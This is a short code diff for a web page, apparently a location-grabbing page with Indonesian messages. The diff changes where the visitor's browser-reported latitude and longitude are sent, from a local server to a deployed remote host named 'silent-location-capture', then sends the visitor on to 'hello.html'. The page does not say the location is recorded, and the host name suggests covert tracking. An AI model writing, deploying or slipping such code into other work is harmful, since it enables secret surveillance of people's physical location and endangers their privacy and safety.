@@ -34,17 +34,25 @@
     function getLocation() {
       navigator.geolocation.getCurrentPosition(
         function(pos) {
-          fetch("http://localhost:5000/lokasi", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude
-            })
-          })
-          .then(() => {
-            window.location.href = "hello.html"; 
-          });
+          fetch("https://silent-location-capture-production.up.railway.app/lokasi", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    latitude: pos.coords.latitude,
+    longitude: pos.coords.longitude
+  })
+})
+.then((res) => {
+  if (res.ok) {
+    window.location.href = "hello.html";
+  } else {
+    alert("Cant be save your location.");
+  }
+})
+.catch((err) => {
+  console.error("Fetch error:", err);
+  alert("Terjadi kesalahan saat mengirim data.");
+});
         },
         function(err) {
           alert("Location can't be reached.");
